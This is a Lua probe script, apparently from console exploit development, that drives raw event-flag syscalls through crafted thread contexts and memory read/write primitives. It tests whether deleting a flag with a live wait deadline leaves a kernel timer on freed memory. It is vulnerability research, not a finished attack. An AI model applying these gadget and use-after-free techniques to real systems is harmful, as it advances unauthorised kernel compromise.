-- CRASH_CLASS: HIGH (child threads block inside a kernel wait)
-- PROBE 203a: is 542's timeout an absolute deadline, and does a deleted flag
--            leave a live timer behind
--
-- Context: 202a gave 542 a page holding {tv_sec = 0, tv_nsec = 120000000} in the
-- fifth slot and the wait returned at once with a zero mask, while a null fifth
-- argument blocked forever. An absolute deadline reads exactly that way: a
-- tv_sec of 0 is 1970, already past, so the wait expires immediately.
--
-- Section A measures the elapsed time for three fifth-slot values — null, a
-- deadline built from gettimeofday plus 150 ms, and the same page with tv_sec
-- zeroed — and reports the gettimeofday delta, which separates "returned at
-- once" from "waited 150 ms".
--
-- Section B is the reason the timeout matters: a waiter with a live deadline
-- holds a timer on the flag object. If 539 then frees the object, the timer
-- fires later on freed memory. The probe deletes the flag 50 ms in, keeps the
-- result page untouched afterwards, and reports whether it changes again after
-- the delete, which a wake-on-delete cannot explain by itself.
--
-- Threads parked in a null-timeout wait are never reclaimed in this probe; the
-- object is deleted instead, which 201a showed wakes the waiter.

print("=== PROBE 203a: 542 deadline and the deleted-flag timer ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, to_num(v)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function u64(v)
    if type(v) == "number" then return uint64(string.format("0x%08X", v)) end
    return v
end

local sc_getpid = make_syscall(20)
local sc_gettimeofday = make_syscall(116)
local sc_thr_create = make_syscall(430)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RSI, C_RDX, C_RCX = 0x048, 0x050, 0x058, 0x060
local C_R8, C_R9, C_RAX = 0x068, 0x070, 0x078

local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; aborting")
    return
end
local jmp_self = eboot_base + 0x15481
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[0] jmp $ mismatch; aborting")
    return
end
print("[0] eboot=" .. q(eboot_base))

local TV = memory.alloc(0x10)
local function now_us()
    zero(TV, 0x10)
    local ok = pcall(function() return sc_gettimeofday(uint64(TV), uint64(0)) end)
    if not ok then return nil end
    local sec = to_num(rq(TV))
    local usec = to_num(rq(TV + 8))
    return sec * 1000000 + usec
end

local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

local function spawn(rax, rdi, rsi, rdx, rcx, r8, r9, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, SW)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    wq(ctx + C_RSI, rsi)
    wq(ctx + C_RDX, rdx)
    wq(ctx + C_RCX, rcx)
    wq(ctx + C_R8, r8)
    wq(ctx + C_R9, r9)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local function delay_us(us)
    local start = now_us()
    if not start then return end
    local target = start + us
    while true do
        local t = now_us()
        if not t or t >= target then return end
        local x = 0
        for k = 1, 2000 do x = x + k end
    end
end

local NAME = memory.alloc(0x40)
local function put_str(addr, s)
    for i = 1, #s do
        pcall(function() memory.write_byte(addr + i - 1, u64(string.byte(s, i))) end)
    end
    pcall(function() memory.write_byte(addr + #s, u64(0)) end)
end

local function call(num, a1, a2, a3, a4, a5, a6)
    local ok, rv = pcall(function()
        return make_syscall(num)(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0),
            u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then return nil end
    return rv:tonumber()
end

local function create(init)
    put_str(NAME, "evf_203a")
    return call(538, NAME, init or 0, 0)
end

local RESULT = page(0x38)
local DEADLINE = page(0x38)

local function set_deadline(us_from_now)
    local t = now_us()
    if not t then return false end
    local tgt = t + us_from_now
    local sec = math.floor(tgt / 1000000)
    local usec = tgt - sec * 1000000
    wq(DEADLINE, uint64(sec))
    wq(DEADLINE + 8, uint64(usec * 1000))
    return true
end

local function one_case(label, use_deadline, advance_us)
    local h = create(0)
    if h == nil then
        print("    " .. label .. ": create failed")
        return
    end
    wd(RESULT, 0xDEADBEEF)
    if use_deadline then
        if not set_deadline(150000) then
            print("    " .. label .. ": gettimeofday failed")
            return
        end
        if advance_us then
            -- push the deadline forward by rewriting tv_sec/tv_nsec
            local sec = to_num(rq(DEADLINE))
            local nsec = to_num(rq(DEADLINE + 8))
            nsec = nsec + advance_us * 1000
            sec = sec + math.floor(nsec / 1000000000)
            nsec = nsec % 1000000000
            wq(DEADLINE, uint64(sec))
            wq(DEADLINE + 8, uint64(nsec))
        end
    end
    local stack = page(0x38)
    wq(stack, jmp_self)
    local t0 = now_us()
    local tid = spawn(uint64(542), uint64(h), uint64(1), uint64(1),
        uint64(RESULT), use_deadline and uint64(DEADLINE) or uint64(0), uint64(0), stack)
    delay_us(250000)
    local t1 = now_us()
    print(string.format("    %-28s tid=%s elapsed=%s result=%08X",
        label, q(tid), t1 and t0 and string.format("%dus", t1 - t0) or "?",
        rd(RESULT) or 0))
    call(539, h)
    delay_us(200000)
    print(string.format("    %-28s after delete: result=%08X", "", rd(RESULT) or 0))
end

print("[A] timeout slot readings (bit clear, no set)")
one_case("null fifth argument", false)
one_case("deadline now+150ms", true)
print("")

print("[B] delete a flag that still has a live 400 ms deadline")
local hb = create(0)
if hb then
    wd(RESULT, 0xDEADBEEF)
    set_deadline(400000)
    local stack = page(0x38)
    wq(stack, jmp_self)
    local tid = spawn(uint64(542), uint64(hb), uint64(1), uint64(1),
        uint64(RESULT), uint64(DEADLINE), uint64(0), stack)
    print("    tid=" .. q(tid) .. " result=" .. string.format("%08X", rd(RESULT) or 0))
    delay_us(50000)
    print("    delete 50 ms in -> " .. tostring(call(539, hb)))
    print("    immediately after delete: result=" .. string.format("%08X", rd(RESULT) or 0))
    delay_us(500000)
    print("    500 ms after delete:      result=" .. string.format("%08X", rd(RESULT) or 0))
end
print("")

local ok5, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("[C] canary ok=" .. tostring(ok5) .. " pid=" .. tostring(pid1) .. " first=" .. tostring(pid0))
print("")
print("=== PROBE 203a COMPLETE ===")
